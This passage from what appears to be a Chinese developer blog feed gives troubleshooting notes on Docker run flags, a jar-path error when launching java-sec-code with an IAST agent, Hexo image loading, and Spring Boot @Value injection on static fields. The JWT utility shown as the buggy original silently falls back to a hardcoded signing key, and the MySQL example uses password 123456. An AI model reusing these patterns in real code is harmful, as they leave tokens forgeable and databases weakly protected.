在后台运行容器。即使你关闭了终端，容器也会继续运行。</li></ol><p>综合起来，<code>-itd</code>的组合允许你在后台运行一个容器，并且仍然能够与容器进行交互。这对于在生产环境中运行容器时非常有用，因为你可以在后台运行它们，同时仍然能够与容器进行通信，查看日志，或者执行其他管理任务。</p><p>加了才会正常运行，完整的指令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 3306:3306 --name  sample-mysql -e MYSQL_ROOT_PASSWORD=123456 -v /mydata/mysql/log:/var/log/mysql -v /mydata/mysql/data:/var/lib/mysql -v /mydata/mysql/conf:/etc/mysql -d mysql:8.0 /bin/bash</span><br></pre></td></tr></table></figure><h1 id="docker使用openjdk镜像携带一个jar包启动容器报错"><a href="#docker使用openjdk镜像携带一个jar包启动容器报错" class="headerlink" title="docker使用openjdk镜像携带一个jar包启动容器报错"></a>docker使用openjdk镜像携带一个jar包启动容器报错</h1><p>执行的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8881:8081 -v /usr/local/javaseccode:/usr/local/javaseccode --name javaseccode_dongtai openjdk:8u252 java -javaagent:/usr/local/iast/javaseccode/dongtai_agent.jar -jar /usr/local/java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure><p>报错信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unable to access jarfile java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure><h2 id="命令解释"><a href="#命令解释" class="headerlink" title="命令解释"></a>命令解释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run #启动一个新的容器；</span><br><span class="line">-d #在后台（守护进程）运行容器；</span><br><span class="line">-p 8881:8081 #将主机的8881端口映射到容器内的8081端口；</span><br><span class="line">-v /usr/local/javaseccode:/usr/local/javaseccode #将主机上的&#x27;/usr/local/javaseccode&#x27;目录映射到容器内的&#x27;/usr/local/javaseccode&#x27;目录，实现主机和容器之间的文件共享；</span><br><span class="line">--name javaseccode_dongtai #将容器命名为该名称；</span><br><span class="line">openjdk:8u252 #使用的Docker镜像名称；</span><br><span class="line">java -javaagent:/usr/local/iast/dongtai_agent.jar -jar /usr/local/java-sec-code-1.0.0.jar 在容器中执行的java命令，包含javaagent的陆景和要执行的jar文件路径。</span><br></pre></td></tr></table></figure><h2 id="问题发现"><a href="#问题发现" class="headerlink" title="问题发现"></a>问题发现</h2><p>经过排查，发现是启动容器后，在容器内执行java命令时，找不到对应的jar包。排查是否是目录映射出了问题。</p><p>修改命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8881:8081 -v /usr/local:/usr/local --name javaseccode_dongtai openjdk:8u252 java --javaagent:/usr/local/iast/javaseccode/dongtai_agent.jar -jar /usr/local/java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure><p>将&#x2F;usr&#x2F;local目录映射到容器内，然而仍然报错，尝试改变思路，将该jar包放在&#x2F;usr&#x2F;local&#x2F;javaseccode目录中，再次映射：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8881:8081 -v /usr/local/javaseccode:/usr/local/javaseccode --name javaseccode_dongtai openjdk:8u252 java -javaagent:/usr/local/iast/javaseccode/dongtai_agent.jar -jar /usr/local/javaseccode/java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure><p>问题解决。</p><h1 id="Hexo文章图片无法加载"><a href="#Hexo文章图片无法加载" class="headerlink" title="Hexo文章图片无法加载"></a>Hexo文章图片无法加载</h1><h3 id="Hexo侧"><a href="#Hexo侧" class="headerlink" title="Hexo侧"></a>Hexo侧</h3><p>首先确认根目录_config.yml中有:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>然后在hexo所在根目录，启动git bash终端下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>该指令的目的是下载0.0.5版本的hexo-asset-image，1.0.0版本实测无法正常加载图片。</p><h3 id="Typora侧"><a href="#Typora侧" class="headerlink" title="Typora侧"></a>Typora侧</h3><p>在设置中，将图片的保存设置修改为：</p><p><img src="/2023/11/17/problem-resolved/image-20231129103946710.png" alt="image-20231129103946710"></p><p>完成。现在图片可以正常显示。</p><h1 id="Springboot项目中-Value注解无法正常注入"><a href="#Springboot项目中-Value注解无法正常注入" class="headerlink" title="Springboot项目中@Value注解无法正常注入"></a>Springboot项目中@Value注解无法正常注入</h1><h3 id="原代码"><a href="#原代码" class="headerlink" title="原代码"></a>原代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.erickin.Util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Configurable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.PostConstruct;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.signKey&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">static</span> String signKey;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.expire&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">static</span> Long expireTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成Jwt</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> claims</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateJwt</span><span class="params">(Map&lt;String, Object&gt; claims)</span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;==================generateJwt方法开始执行&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;==================signKey:&#123;&#125;, expireTime:&#123;&#125;&quot;</span>, signKey, expireTime);</span><br><span class="line">        <span class="keyword">if</span>(signKey == <span class="literal">null</span> || signKey == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            log.info(<span class="string">&quot;signKey注入失败&quot;</span>);</span><br><span class="line">            signKey = <span class="string">&quot;errorHappened&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(expireTime == <span class="literal">null</span>)&#123;</span><br><span class="line">            log.info(<span class="string">&quot;expireTime注入失败&quot;</span>);</span><br><span class="line">            expireTime = <span class="number">10000000000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.builder()</span><br><span class="line">                .addClaims(claims)</span><br><span class="line">                .signWith(SignatureAlgorithm.HS256, signKey)</span><br><span class="line">                .setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + expireTime))</span><br><span class="line">                .compact();</span><br><span class="line">        <span class="keyword">return</span> jwt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析Jwt</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jwt</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Claims <span class="title function_">parseJwt</span><span class="params">(String jwt)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(signKey == <span class="literal">null</span> || signKey == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            log.info(<span class="string">&quot;signKey注入失败&quot;</span>);</span><br><span class="line">            signKey = <span class="string">&quot;errorHappened&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(expireTime == <span class="literal">null</span>)&#123;</span><br><span class="line">            log.info(<span class="string">&quot;expireTime注入失败&quot;</span>);</span><br><span class="line">            expireTime = <span class="number">10000000000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.parser()</span><br><span class="line">                .setSigningKey(signKey)</span><br><span class="line">                .parseClaimsJws(jwt)</span><br><span class="line">                .getBody();</span><br><span class="line">        <span class="keyword">return</span> claims;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h3><ul><li>由于Springboot实例化的顺序问题，<code>@Value</code>注解不能加在静态属性和方法中，静态属性会最先初始化并赋值，先于@Value；</li><li>修改后发现仍然无法正常注入，发现是类上需要加<code>@Component</code>注解，使其随着Springboot实例化；</li><li>修改后仍然发现无法注入，在使用到该类的类中，通过<code>@Autowired</code>注入类的实例，最终解决了问题。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><code>@value</code>不能加在静态属性上；</li><li>如果类中使用了<code>@Value</code>，需要在类上加上<code>@Component</code>；</li><li>在使用该方法的类中，通过<code>@Autowired</code>实例化。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Finalshell无法上传文件问题&quot;&gt;&lt;a href=&quot;#Finalshell无法上传文件问题&quot; class=&quot;headerlink&quot; title=&quot;Finalshell无法上传文件问题&quot;&gt;&lt;/a&gt;Finalshell无法上传文件问题&lt;/h1&gt;&lt;p&gt;连接管理器 </summary>
      
    
    
    
    <category term="其他" scheme="https://erickinyae.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="问题" scheme="https://erickinyae.github.io/tags/%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
</feed>
